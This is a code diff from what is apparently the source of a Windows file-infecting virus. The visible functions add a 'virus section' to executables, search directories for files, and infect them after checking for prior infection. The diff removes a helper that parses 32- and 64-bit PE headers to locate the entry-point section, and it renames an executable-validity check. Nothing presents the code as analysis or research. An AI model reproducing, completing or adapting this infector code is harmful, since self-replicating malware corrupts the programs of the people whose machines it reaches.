@@ -103,46 +103,6 @@ PIMAGE_SECTION_HEADER WINAPI AddVirusSection(PVOID file_data, PDWORD file_size, 
     return &p_image_section_header[i];
 }
 
-PIMAGE_SECTION_HEADER GetCurrentVirusSection(PVOID mem_data)
-{
-    PIMAGE_DOS_HEADER p_image_dos_header;
-    PIMAGE_SECTION_HEADER p_image_section_header;
-
-    ULONG number_of_sections;
-
-    DWORD entry_address = 0;
-
-    p_image_dos_header = (PIMAGE_DOS_HEADER)mem_data;
-    if (Is64BitExecutable(mem_data))
-    {
-        PIMAGE_NT_HEADERS64 p_image_nt_headers_64;
-        p_image_nt_headers_64 = (PIMAGE_NT_HEADERS64)((PUCHAR)mem_data + p_image_dos_header->e_lfanew);
-        p_image_section_header = (PIMAGE_SECTION_HEADER)(p_image_nt_headers_64 + 1);
-        number_of_sections = p_image_nt_headers_64->FileHeader.NumberOfSections;
-        entry_address = p_image_nt_headers_64->OptionalHeader.AddressOfEntryPoint;
-    }
-    else
-    {
-        PIMAGE_NT_HEADERS32 p_image_nt_headers_32;
-        p_image_nt_headers_32 = (PIMAGE_NT_HEADERS32)((PUCHAR)mem_data + p_image_dos_header->e_lfanew);
-        p_image_section_header = (PIMAGE_SECTION_HEADER)(p_image_nt_headers_32 + 1);
-        number_of_sections = p_image_nt_headers_32->FileHeader.NumberOfSections;
-        entry_address = p_image_nt_headers_32->OptionalHeader.AddressOfEntryPoint;
-
-    }
-
-    for (unsigned int i = 0; i < number_of_sections; i++)
-    {
-        if (p_image_section_header[i].VirtualAddress <= entry_address && 
-            entry_address <= p_image_section_header[i].VirtualAddress + p_image_section_header[i].Misc.VirtualSize)
-        {
-            return &p_image_section_header[i];
-        }
-    }
-    return NULL;
-
-}
-
 void WINAPI FindFile(PSTR directory, const PDATA data)
 {
     HANDLE handle_find;
@@ -256,7 +216,7 @@ void WINAPI InfectFile(PSTR file_name, PDATA data)
         goto END_FUNCTION;
     }
 
-    if (!IsValidExecutable(file_data) || IsVirusExistedInFile(file_data))
+    if (!IsValidExeFile(file_data) || IsVirusExistedInFile(file_data))
     {
         goto END_FUNCTION;
     }
